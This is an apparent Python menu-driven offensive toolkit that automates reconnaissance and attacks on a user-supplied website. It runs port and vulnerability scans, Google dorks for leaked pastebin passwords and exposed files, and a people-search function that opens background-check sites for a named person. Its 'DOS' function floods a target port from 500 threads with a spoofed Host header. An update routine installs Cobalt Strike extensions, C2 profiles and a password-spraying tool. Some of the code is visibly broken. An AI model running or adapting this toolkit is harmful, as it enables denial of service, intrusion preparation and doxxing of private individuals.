#!/usr/bin/env python3
import os
import sys
from subprocess import CompletedProcess
import time
import subprocess
import time
import webbrowser
import re
import socket
import threading 
#####################################################
# Define some colors for text outputs
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
BLUE="\033[0;34m"
NC='\033[0m' # No Color
#####################################################
# Define the banner
BANNER = f"""
{RED}██████████████████████████████████{RED}
███{BLUE}                            {RED}███
███{BLUE}  ██╗  ██╗██╗   ██╗███████╗ {RED}███
███{RED}  ╚██╗██╔╝╚██╗ ██╔╝╚══███╔╝ {RED}███
███{GREEN}   ╚███╔╝  ╚████╔╝   ███╔╝  {RED}███
███{YELLOW}   ██╔██╗   ╚██╔╝   ███╔╝   {RED}███
███{BLUE}  ██╔╝ ██╗   ██║   ███████╗ {RED}███
███{RED}  ╚═╝  ╚═╝   ╚═╝   ╚══════╝ {RED}███
███{GREEN}                            {RED}███
{RED}██████████████████████████████████
{RED}██████████████████████████████████
{RED}███This tool is meant for :    ███
{RED}███Research purproses only,and ███
{RED}███the usage of this tool is   ███
{RED}███extremely prohibited!!  ☠   ███
{RED}██████████████████████████████████
"""
#####################################################
# Define the menu function
def menu():
    print(BANNER)
    print(f"{YELLOW}Choose an option:{NC}")
    print(f"{YELLOW}1.{NC}[*]Passive Recon")
    print(f"{YELLOW}2.{NC}[*]Active Recon")
    print(f'{YELLOW}3.{NC}[*]Find Person')
    print(f'{YELLOW}4.{NC}[*]Metasploit')
    print(f'{YELLOW}5.{NC}[*]DOS')
    print(f"{BLUE}6.{NC}[*]Full Update")
    print(f'{BLUE}7.{NC}[*]Generate Targets')
    print(f"{GREEN}8.{NC}[*]Exit")
#####################################################
# Define the passive recon function                                                                                                                     
def passive_recon():
    print("""
          
                            ,--.
                           (    )
                           K,   }
                          /  ~Y`
                     ,   /   /
                    {_'-K.__/
                      `/-.__L._
                      /  ' /`\_}
                     /  ' /
             ____   /  ' /
      ,-'~~~~    ~~/  ' /_
    ,'             ``~~~  ',
   (                        Y
  {          PASIVE RECON    I
 {      -                    `,
 |       ',                   )
 |        |   ,..__      __. Y
 |    .,_./  Y ' / ^Y   J   )|
 \           |' /   |   |   ||
  \          L_/    . _ (_,.'(
   \,   ,      ^^""' / |      )
     \_  \          /,L]     /
       '-_~-,       ` `   ./`
          `'{_            )
              ^^\..___,.--` 
          
          """)

    website = input("[*] Enter the website: ")
    print()
    print(f"{GREEN}[*] Running Passive Recon..{NC}")
    if not os.path.exists("/opt/XYZ/active_recon"):
        os.chdir("/opt")
        os.system("mkdir XYZ")
        os.chdir("/opt/XYZ")
        os.system("mkdir passive_recon")
        os.chdir("/opt/XYZ/passive_recon")
    # WHOIS info
    start_time = time.time()
    print(f"{GREEN}[*] WHOIS Info:{NC}")
    os.system(f"whois {website}")
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")

    # DNSRecon
    start_time = time.time()
    print(f"{GREEN}[*] DNSRecon:{NC}")
    os.system(f"/usr/bin/python3 /opt/DNSRecon/dnsrecon.py -d {website} -n 8.8.8.8 -t std > /opt/XYZ/dnsrecon.txt")
    os.system("pwd")
    print()
    print(f"Time taken: {time.time() - start_time:.2f} seconds")

    # Robots.txt
    start_time = time.time()
    print(f"{GREEN}[*] Robots.txt:{NC}")
    os.system(f"curl -s 'https://{website}/robots.txt'")
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    print()
    

    # Metasploit
    start_time = time.time()
    print(f"{GREEN}[*] Metasploit:{NC}")
    website = website.replace(".", "\.")
    command = f"msfconsole -q -x 'use auxiliary/gather/search_email_collector; set DOMAIN {website}; run; exit y' | grep @{website} | awk '{{print $2}}' | tr '[A-Z]' '[a-z]' | sort -u > msf"
    os.system(command)
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    print()

    # SubFinder
    start_time = time.time()
    print(f'{GREEN}[*] SubFinder:{NC}')
    os.system(f'/opt/subfinder/v2/cmd/subfinder/subfinder -d {website} -silent | sort -u > zsubfinder')
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    print()
    
    # DNSTwist-NOT-WORKING
    """start_time = time.time()
    print(f'{GREEN}[*]DNSTwist:{NC}')
    os.system(f"dnstwist --registered {website} > tmp")
    os.system("cat tmp | grep -v 'original' | sed 's/!ServFail/         /g; s/[ \t]*$//' | column -t | sed 's/[ \t]*$//' > squatting")
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    print()
    

    with open("squatting", "r") as f:
        squatting_domains = [line.strip() for line in f]
    print(squatting_domains)
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    print()
    """

    #Emails
    start_time = time.time()
    print(f'{GREEN}[*]Emails:')
    curl_url = f"https://whois.arin.net/rest/pocs\{website}={website}"
    with open("tmp.xml", "wb") as f:
        subprocess.run(["curl", "--cipher", "ECDHE-RSA-AES256-GCM-SHA384", "-k", "-s", curl_url], stdout=f)

    if not any("No Search Results" in line for line in open("tmp.xml")):
        with open("tmp.xml", "r") as f:
            xml_output = subprocess.check_output(["xmllint", "--format", "-"], stdin=f)
        with open("zurls.txt", "wb") as f:
            subprocess.run(["grep", "handle"], input=xml_output, stdout=subprocess.PIPE)
            subprocess.run(["cut", "-d", ">", "-f2"], stdout=f, input=subprocess.PIPE)
            subprocess.run(["cut", "-d", "<", "-f1"], stdout=f, input=subprocess.PIPE)
            subprocess.run(["sort", "-u"], stdout=f, input=subprocess.PIPE)

        with open("tmp.xml", "r") as f:
            xml_output = subprocess.check_output(["xmllint", "--format", "-"], stdin=f)
        with open("zhandles.txt", "wb") as f:
            subprocess.run(["grep", "handle"], input=xml_output, stdout=subprocess.PIPE)
            subprocess.run(["cut", "-d", "\"", "-f2"], stdout=f, input=subprocess.PIPE)
            subprocess.run(["sort", "-u"], stdout=f, input=subprocess.PIPE)

        with open("tmp", "wb") as f:
            with open("zurls.txt", "r") as url_file:
                for url in url_file:
                    url = url.strip()
                    curl_command = ["curl", "--cipher", "ECDHE-RSA-AES256-GCM-SHA384", "-k", "-s", url]
                    with open("tmp2.xml", "wb") as tmp2_file:
                        subprocess.run(curl_command, stdout=tmp2_file)
                    with open("tmp2.xml", "r") as tmp2_file:
                        xml_output = subprocess.check_output(["xml_grep", "email", "--text_only", "-"], stdin=tmp2_file)
                        subprocess.run(["echo", xml_output.decode("utf-8")], stdout=f, shell=True)
                        print(f'{RED}[*]Emails Done!{NC}')
                        os.system("pwd")
                        print(f"Time taken: {time.time() - start_time:.2f} seconds")
                           
           
    print(f'{BLUE}Goohost...{NC}')
    start_time = time.time()
    # Run goohost script for IP and email discovery
    subprocess.run(["/discover/mods/goohost.sh", "-t", website, "-m", "ip"], stdout=subprocess.DEVNULL)
    subprocess.run(["/discover/mods/goohost.sh", "-t", website, "-m", "mail"], stdout=subprocess.DEVNULL)
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")

    # Extract relevant information from report files
    start_time = time.time()
    cmd = f"cat report-* | grep {website} | column -t | sort -u > zgoohost"
    subprocess.run(cmd, shell=True)
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    
    start_time = time.time()
    print(f'{BLUE}TheHarvester...{NC}')
    os.system("source /opt/theHarvester-venv/bin/activate")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b anubis | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zanubis")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b baidu | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zbaidu")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b binaryedge | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zbinaryedge")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b bing | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zbing")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b bingapi | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zbing-api")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b bufferoverun | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zbufferoverun")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b censys | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zcensys")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b certspotter | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zcertspotter")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b crtsh | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zcrtsh")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b dnsdumpster | egrep -v '(!|\\*|--|\\[|Searching)' | sed '/^$/d' > zdnsdumpster")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b duckduckgo | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zduckduckgo")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b fullhunt | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zfullhunt")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b github-code | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zgithub-code")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b hackertarget | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zhackertarget")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b hunter | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zhunter")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b intelx | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zintelx")            
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b otx | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zotx")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b pentesttools | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zpentesttools")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b projectdiscovery | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zprojectdiscovery")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b qwant | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zqwant")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b rapiddns | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zrapiddns")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b securityTrails | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zsecuritytrails")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b sublist3r | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zsublist3r")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b threatcrowd | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zthreatcrowd")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b threatminer | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zthreatminer")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b urlscan | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zurlscan")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b virustotal | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zvirustotal")
    os.system(f"/opt/theHarvester/theHarvester.py -d {website} -b yahoo | egrep -v '(!|\*|--|\[|Searching)' | sed '/^$/d' > zyahoo")
    os.system("rm tmp*")
    os.system("deactivate")
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
            
            
    print(f'{BLUE} IP: ... {NC}')
    start_time = time.time()
    #GET IP FROM PING
    ping_output = os.popen(f"ping -c1 {website}").read()
    ip = ping_output.split('(')[1].split(')')[0]

    # Run whois command and write output to a file
    os.system(f"whois {ip} > tmp")

    # Remove blank lines from beginning and end of file
    with open('tmp') as f:
        lines = f.readlines()
    lines = [line for line in lines if not line.startswith('#') and 'Comment:' not in line]
    lines = list(filter(None, map(str.strip, lines)))

    # Compress consecutive blank lines
    compressed_lines = []
    for line in lines:
        if line == '' and compressed_lines and compressed_lines[-1] == '':
            continue
        compressed_lines.append(line)

    # Write compressed lines to a file with formatted output
    with open('whois-ip', 'w') as f:
        for line in compressed_lines:
            parts = line.split(':', maxsplit=1)
            if len(parts) == 2:
                f.write(f"{parts[0].strip():<25} {parts[1].strip()}\n")
            else:
                f.write(line.strip() + '\n')

    # Remove temporary files
    os.system("rm tmp*")
    print("Done")
    os.system("pwd")
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
                
                  
    print(f'{BLUE} WEB BROWSER... {NC}')
    start_time = time.time()
    
    webbrowser.open(f"https://www.google.com/search?q=%22{website}%22+logo")
    time.sleep(4)

    # Open Google search for "internal use only" pages on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+%22internal+use+only%22")
    time.sleep(4)

    # Open Shodan search for website IP address
    webbrowser.open(f"https://www.shodan.io/search?query={website}")
    time.sleep(4)

    # Open Shodan search for organization name associated with website
    webbrowser.open(f"https://www.shodan.io/search?query=org:%22{website}%22")
    time.sleep(4)

    # Open Google search for pages with directory listings on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+%22index+of/%22+OR+%22parent+directory%22")
    time.sleep(4)

    # Open Justia search for cases involving the company name or website
    webbrowser.open(f"https://dockets.justia.com/search?parties=%22{website}%22&cases=mostrecent")
    time.sleep(4)

    # Open Google search for pages containing login information on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+username+OR+password+OR+login+-Find")
    time.sleep(4)

    # Open Google search for Atlassian or Jira pages on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+Atlassian+OR+jira+-%22Job+Description%22+-filetype%3Apdf")
    time.sleep(4)

    # Open NetworksDB search for organization name associated with website
    webbrowser.open(f"https://networksdb.io/search/org/%22{website}%22")
    time.sleep(4)

    # Open Google search for leaked passwords associated with company name or website
    webbrowser.open(f"https://www.google.com/search?q=site:pastebin.com+%22{website}%22+password")
    time.sleep(6)

    # Open Google search for Microsoft Word documents on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+ext:doc+OR+ext:docx")
    time.sleep(7)

    # Open Google search for Microsoft Excel documents on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+ext:xls+OR+ext:xlsx")
    time.sleep(8)

    # Open Google search for Microsoft PowerPoint presentations on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+ext:ppt+OR+ext:pptx")
    time.sleep(9)

    # Open Google search for text, log, or backup files on website
    webbrowser.open(f"https://www.google.com/search?q=site:{website}+ext:txt+OR+ext:log+OR+ext:bak")
    time.sleep(4)

    # Open website in browser
    webbrowser.open(website)    
    os.system('pwd')
    print(f"Time taken: {time.time() - start_time:.2f} seconds")
    print(f'{RED} Scan complete!! CHECK YOUR FILES AT THE DIRECTORY PASSIVE_RECON{NC}')
                                          
def active_recon():
    #####################################################
    print("""
          
          _,.-----.,_
       ,-~           ~-.
      ,^___           ___^.
    /~"   ~"   .   "~   "~\\
   |                       |
   Y  ,--._    I    _.--.  Y
    |                       |
    | Y     ~-. | ,-~     Y |
    | |        }:{        | |
    j l       / | \       ! l
 .-~  (__,.--" .^. "--.,__)  ~-.
(           / / | \ \           )
 \.____,   ~  \/"\/  ~   .____,/
  ^.____                 ____.^
     | |T ~\  !   !  /~ T| |
     | |l   _ _ _ _ _   !| |
     | l \/V V V V V V\/ j |
     l  \ \|_|_|_|_|_|/ /  !
     \  \[T T T T T TI/   /
      \  `^-^-^-^-^-^'   /
       \  ACTIVE RECON  /
         \.           ,/
           "^-.___,-^"
           
          """)
    start_time = time.time()
    #Colocar o dominio do website
    website = input("[*] Enter the website: ")
    print()
    if not os.path.exists("/opt/XYZ/active_recon"):
        os.chdir("/opt")
        os.system("mkdir XYZ")
        os.chdir("/opt/XYZ")
        os.system("mkdir active_recon")
        os.chdir("/opt/XYZ/active_recon")
        #Print com cor verde e depois output sem cor
        print(f"{GREEN}[*] Running Active Recon...{NC}")
        print()
        #Correr no systema o nmap com a variavel "website" referenciada anteriormente
        print(f'{GREEN}[*]Nmap:{NC}')
        os.system(f"nmap -sS -p- '{website}' -oN nmap_scan.txt")
        print()
        print(f"Time taken: {time.time() - start_time:.2f} seconds")
        #Same
        start_time = time.time()
        print(f'{GREEN}[*]Nikto:{NC}')
        os.system(f"nikto -host '{website}'")
        print(f"Time taken: {time.time() - start_time:.2f} seconds")
        start_time = time.time()
        print(f'{GREEN}[*]Dirb:{NC}')
        #Same
        os.system(f"dirb 'http://{website}' /usr/share/dirb/wordlists/big.txt -o dirb_scan.txt")
        print(f"Time taken: {time.time() - start_time:.2f} seconds")
    
    #####################################################
    
        print(f'{GREEN} WEB APLICATION...{NC}')
        start_time = time.time()
        os.system(f'wafw00f -a http://{website} > tmp 2>/dev/null')
        os.system ("sed '1,16d' tmp > waf")
        print()
        print(f"Time Taken: {time.time() - start_time:.2f} seconds")
    
    
    #####################################################
        print(f'{GREEN} TRACEROUTE...{NC}')
        start_time = time.time()
        udp_output = subprocess.check_output(["traceroute", website]).decode('utf-8')
        udp_lines = udp_output.split('\n')
        with open('tmp', 'w') as f:
            f.write("UDP\n")
            for line in udp_lines:
                match = re.search(r'^\s*\d+\s+([\w.-]+)', line)
                if match:
                    f.write(match.group(1) + "\n")
            f.write("\n")
            print()
            print(f"Time Taken: {time.time() - start_time:.2f} seconds")

        # ICMP ECHO
        start_time = time.time()
        icmp_output = subprocess.check_output(["traceroute", "-I", website]).decode('utf-8')
        icmp_lines = icmp_output.split('\n')
        with open('tmp', 'a') as f:
            f.write("ICMP ECHO\n")
            for line in icmp_lines:
                match = re.search(r'^\s*\d+\s+([\w.-]+)', line)
                if match:
                    f.write(match.group(1) + "\n")
            f.write("\n")
            print()
            print(f"Time Taken: {time.time() - start_time:.2f} seconds")


        # TCP SYN
        start_time = time.time()
        tcp_output = subprocess.check_output(["traceroute", "-T", website]).decode('utf-8')
        tcp_lines = tcp_output.split('\n')
        with open('tmp', 'a') as f:
            f.write("TCP SYN\n")
            for line in tcp_lines:
                match = re.search(r'^\s*\d+\s+([\w.-]+)', line)
                if match:
                    f.write(match.group(1) + "\n")
            f.write("\n")
            print()
            print(f"Time Taken: {time.time() - start_time:.2f} seconds")

        # Remove traceroute lines and blank lines from end of file
        start_time = time.time()
        with open('tmp', 'r') as f1, open('tmp2', 'w') as f2:
            for line in f1:
                if "traceroute" not in line:
                    f2.write(line)
            f2.seek(0)
            lines = f2.readlines()
            while lines[-1].strip() == "":
                lines.pop()
            with open('traceroute', 'w') as f3:
                f3.writelines(lines) 
            print()
            print(f"Time Taken: {time.time() - start_time:.2f} seconds")
                
        #####################################################
        
        #start_time = time.time()
        #print('{BLUE} Recon-NG...{NC}')
        print(f'{RED} Scan complete! {NC}')    
        
def dos():
    print("""
                       ______
                    .-"      "-.
                   /            \|
                  |              |    
                  |     DOS      |     
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(__/  \__)( |     _.=" <
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
       
          """)
    
    print("Enter ip Address of The Target ")
    print("To Get the ip adress You can ping the domain in the terminal. eg #target = '120.00.00.000'")
    target = input("\t == > ")
    print("Enter The Fake Ip Address that you wants to spoof. eg: #fake_ip = '120.00.00.01'  ")
    fake_ip = input("\t\t ==> ")
    print("Enter The Port Number You Want to Attack ? ")
    port = input("\t\t ==> ")

    port = int(port)

    attack_num = 0

    print("Sending Packets...")

    def attack():

        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            
            global attack_num
            attack_num += 1
            packesnum =attack_num
            packesnum= str(packesnum)
            print("Packets Sending => "+packesnum)
            print("Done")
            
            s.close()
    print("Packets Send Sucess!")
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()
      
def metasploit():
    print("""
                      ______
                   .-"      "-.
                  /            \
                 |              |
                 |,  .-.  .-.  ,|
                 | )(_o/  \o_)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
_______) \_______\__|IIIIII|__/___________________________>
|        _______  | __________|   _____META______SPLOIT______>
(_)@8@8{}<________|-\IIIIII/-|___________________________>
        )_/        \          /
       (@           `--------`
            
    """)      
              
def person():
    print("""
          
                          _,.---,---.,_
            |         ,;~'             '~;,
            |       ,;                     ;,
   Frontal  |      ;                         ; ,--- Supraorbital Foramen
    Bone    |     ,'       FIND PERSON       /'
            |    ,;                        /' ;,
            |    ; ;      .           . <-'  ; |
            |__  | ;   ______       ______   ;<----- Coronal Suture
           ___   |  '/~"     ~" . "~     "~\'  |
           |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 Maxilla,  |      |   |        }:{        | <------ Orbit
Nasal and  |      |   l       / | \       !   |
Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~.
  Bones    |      |    ----;' / | \ `;-<--------- Infraorbital Foramen
           |__     \__.       \/^\/       .__/
              ___   V| \                 / |V <--- Mastoid Process
              |      | |T~\___!___!___/~T| |
              |      | |`IIII_I_I_I_IIII'| |
     Mandible |      |  \,III I I I III,/  |
              |       \   `~~~~~~~~~~'    /
              |         \   .       . <-x---- Mental Foramen
              |__         \.    ^    ./
                            ^~~~^~~~^
          
          """)   
    
    print(f'{BLUE}[*] PERSONFINDER {NC}')
    start_time = time.time()
    firstName = input("[*]First name: ")
    # Check for no answer
    if not firstName:
        f_error()

    lastName = input("[*]Last name: ")
    # Check for no answer
    if not lastName:
        f_error()

    os.system(f"xdg-open https://www.411.com/name/{firstName}-{lastName}/")
    time.sleep(2)
    uripath = f"https://www.advancedbackgroundchecks.com/search/results.aspx?type=&fn={firstName}&mi=&ln={lastName}&age=&city=&state="
    os.system(f"xdg-open {uripath}")
    time.sleep(2)
    os.system(f"https://www.linkedin.com/pub/dir/?first={firstName}\&last={lastName}\&search=Search")
    time.sleep(2)
    os.system(f"https://www.peekyou.com/{firstName}%5f{lastName}")
    time.sleep(2)
    os.system(f"https://www.addresses.com/people/{firstName}+{lastName}")
    time.sleep(2)
    os.system(f"https://www.spokeo.com/{firstName}-{lastName}")
    time.sleep(2)
    os.system(f"https://twitter.com/search?q=%22{firstName}%20{lastName}%22&src=typd")
    time.sleep(2)
    os.system(f"https://www.youtube.com/results?search_query={firstName}+{lastName}")
    
    print(f"Time Taken: {time.time() - start_time:.2f} seconds")

def full_update():
    start_time = time.time()
    print("""
                     ______
                  .-"      "-.
                 /            \
                |    UPDATE    |
                |,  .-.  .-.  ,|
           /\   | )(__/  \__)( |
         _ \/   |/     /\     \|
        \_\/    (_     ^^     _)   .-==/~\
       ___/_,__,_\__|IIIIII|__/__)/   /{~}}
       ---,---,---|-\IIIIII/-|---,\'-' {{~}
                  \          /     '-==\}/
                   `--------`   
          """)
    print(f"{BLUE}[*]Updating Kali...{NC}")
    os.system("apt update ; apt -y upgrade ; apt -y dist-upgrade ; apt -y autoremove ; apt -y autoclean")
    print("Done.")

    if os.path.isdir('/opt/cobaltstrike') and os.path.isdir('/opt/cobaltstrike/elevatekit/.git'):
        print(f"{BLUE}[*]Updating CS - ElevateKit...")
        os.chdir('opt/cobaltstrike/eleavtekit/')
        os.system('git pull')
        print()
        
    else:
        print(f"{YELLOW}[*]Installing CS - ElevateKit...{NC}")
        os.system('git clone https://github.com/rsmudge/ElevateKit /opt/cobaltstrike/elevatekit')
        print()
        
    if os.path.isdir('/opt/cobaltstrike/third-party/kyleavery-inject-assembly/.git'):
        print(f"{BLUE}[*]Updating CS - kyleavery Inject Assembly...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/kyleavery-inject-assembly')
        os.system('git pull')
        print()
        
    else:
        print(f"{YELLOW}[*]Installing CS - Kyleavery Inject Assembly.{NC}")
        os.system('git clone https://github.com/kyleavery/inject-assembly /opt/cobaltstrike/third-party/kyleavery-inject-assembly')
        os.system('git pull')
        print()
        
    
    if os.path.isdir('/opt/cobaltstrike/malleable-c2-profiles/.git'):
        print(f"{BLUE}[*]Updating CS - Malleable C2 profiles...{NC}")
        os.chdir('/opt/cobaltstrike/malleable-c2-profiles/')
        os.system('git pull')
        print()

    else:
        print(f"{YELLOW}[*]Installing CS - Malleable C2 profiles.{NC}")
        os.system('git clone https://github.com/Cobalt-Strike/Malleable-C2-Profiles /opt/cobaltstrike/malleable-c2-profiles')
        print()

    if os.path.isdir('/opt/cobaltstrike/third-party/mgeeky-scripts/.git'):
        print(f"{BLUE}[*]Updating CS - mgeeky cobalt arsenal...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/mgeeky-scripts/')
        os.system('git pull')
        print()

    else:
        print(f"{YELLOW}[*]Installing CS - mgeeky cobalt arsenal...{NC}")
        os.system('git clone https://github.com/mgeeky/cobalt-arsenal /opt/cobaltstrike/third-party/mgeeky-scripts')
        print()

    if os.path.isdir('/opt/cobaltstrike/third-party/outflanknl-c2-tool-collection/.git'):
        print(f"{BLUE}[*]Updating CS - Outflanknl C2 Tool Collection...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/outflanknl-c2-tool-collection/')
        os.system('git pull')
        print()

    else:
        print(f"{YELLOW}[*]Installing CS - Outflanknl C2 Tool Collection...{NC}")
        os.system('git clone https://github.com/outflanknl/C2-Tool-Collection /opt/cobaltstrike/third-party/outflanknl-c2-tool-collection')
        print()

    if os.path.isdir('/opt/cobaltstrike/third-party/outflanknl-helpcolor/.git'):
        print(f"{BLUE}[*]Updating CS - Outflanknl HelpColor...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/outflanknl-helpcolor/')
        os.system('git pull')
        print()

    else:
        print(f"{YELLOW}[*]Installing CS - Outflanknl HelpColor...{NC}")
        os.system('git clone https://github.com/outflanknl/HelpColor /opt/cobaltstrike/third-party/outflanknl-helpcolor')
        print()

    if os.path.isdir('/opt/cobaltstrike/third-party/trustedsec-remote-ops/.git'):
        print(f"{BLUE}[*]Updating CS - TrustedSec CS Remote OPs BOF...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/trustedsec-remote-ops/')
        os.system('git pull')
        print()

    else:
        print(f"{YELLOW}[*]Installing CS - TrustedSec CS Remote OPs BOF...{NC}")
        os.system('git clone https://github.com/trustedsec/CS-Remote-OPs-BOF /opt/cobaltstrike/third-party/trustedsec-remote-ops')
        print()

    if os.path.isdir('/opt/cobaltstrike/third-party/trustedsec-sa/.git'):
        print(f"{BLUE}[*]Updating CS - TrustedSec Situational Awareness BOF...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/trustedsec-sa/')
        os.system('git pull')
        print()
        
    else:
        print(f"{YELLOW}[*]Installing CS - TrustedSec Situational Awareness BOF...{NC}")
        os.system('git clone https://github.com/trustedsec/CS-Situational-Awareness-BOF /opt/cobaltstrike/third-party/trustedsec-sa')
        print()

        
    if os.path.isdir('/opt/cobaltstrike/third-party/tylous-sourcepoint/.git'):
        print(f"{BLUE}[*]Updating CS - Tylous SourcePoint...{NC}")
        os.chdir('/opt/cobaltstrike/third-party/tylous-sourcepoint/.git')
        os.system('git pull')

    else:
         print(f"{YELLOW}[*]Installing CS - Tylous SourcePoint...{NC}")
    os.system('git clone https://github.com/Tylous/SourcePoint')
    os.system('git pull')
    os.chdir('/opt/cobaltstrike/third-party/tylous-sourcepoint/')
    os.system("go get gopkg.in/yaml.v2")
    os.system("go build SourcePoint.go")
    print()
    
    if os.path.isdir('/opt/DNSRecon/.git') and os.path.isdir ('/opt/DNSRecon-venv'):
        print(f"{BLUE}[*]Updating DNSRecon...{NC}")
        os.chdir('/opt/DNSRecon')
        os.system('git pull')
        os.system('source /opt/DNSRecon-venv/bin/activate')
        os.system('pip3 install -r requirements.txt --upgrade')
        os.system('deactivate')
        os.system('echo')
        print()
    
    else:
        print(f"{YELLOW}[*]Installing DNSRecon...{NC}")
        os.chdir('/opt/DNSRecon')
        os.system('git clone https://github.com/darkoperator/dnsrecon /opt/DNSRecon')
        print()
        print(f"{YELLOW}[*]Setting up DNSRecon virtualenv...{NC}")
        os.system('virtualenv -p /usr/bin/python3 /opt/DNSRecon-venv')
        os.system('source /opt/DNSRecon-venv/bin/activate')
        os.chdir('/opt/DNSRecon/')
        os.system('pip3 install -r requirements.txt')
        os.system('deactivate') 
        
        if not os.path.exists('/usr/bin/dnstwist'):
            print(f"{YELLOW}[*]Installing dnstwist...{NC}")
            os.system('apt install -y dnstwist')
        print()

        if os.path.exists('/opt/Domain-Hunter/.git'):
            print(f"{BLUE}[*]Updating Domain Hunter...{NC}")
            os.system('cd /opt/Domain-Hunter/ ; git pull')
            print()
        else:
            print(f"{YELLOW}[*]Installing Domain Hunter...{NC}")
            os.system('git clone https://github.com/threatexpress/domainhunter /opt/Domain-Hunter')
            os.chdir('/opt/Domain-Hunter/')
            os.system('pip3 install pytesseract')
            os.system('chmod 755 domainhunter.py')
            print()

        if os.path.exists('/opt/DomainPasswordSpray/.git'):
            print(f"{BLUE}[*]Updating DomainPasswordSpray...{NC}")
            os.system('cd /opt/DomainPasswordSpray/ ; git pull')
            print()
        else:
            print(f"{YELLOW}Installing DomainPasswordSpray.{NC}")
